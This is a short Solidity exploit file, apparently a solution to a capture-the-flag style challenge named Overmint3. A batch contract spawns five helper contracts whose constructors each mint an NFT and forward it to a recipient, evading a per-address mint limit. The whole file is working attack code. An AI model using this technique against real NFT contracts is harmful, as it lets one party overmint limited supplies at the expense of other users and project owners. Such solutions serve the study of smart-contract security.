// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint3.sol";

// SingleNFTMinter contract responsible for minting and transferring one NFT
contract SingleNFTMinter {
    Overmint3 targetContract;

    constructor(address _targetContract, address _recipient) {
        targetContract = Overmint3(_targetContract);
        targetContract.mint();
        targetContract.safeTransferFrom(
            address(this),
            _recipient,
            targetContract.totalSupply()
        ); // Transfer NFT to the recipient's wallet
    }
}

// BatchNFTMinter contract exploits the vulnerability to mint multiple NFTs in one transaction
contract BatchNFTMinter {
    Overmint3 targetContract;
    uint256 minterCounter = 1;

    constructor(address _targetContract, address _recipient) {
        targetContract = Overmint3(_targetContract);
        while (minterCounter < 6) {
            // Loop 5 times to create 5 SingleNFTMinter contract instances
            minterCounter++;
            new SingleNFTMinter(_targetContract, _recipient); // Create a new SingleNFTMinter instance and mint+transfer NFT
        }
    }
}
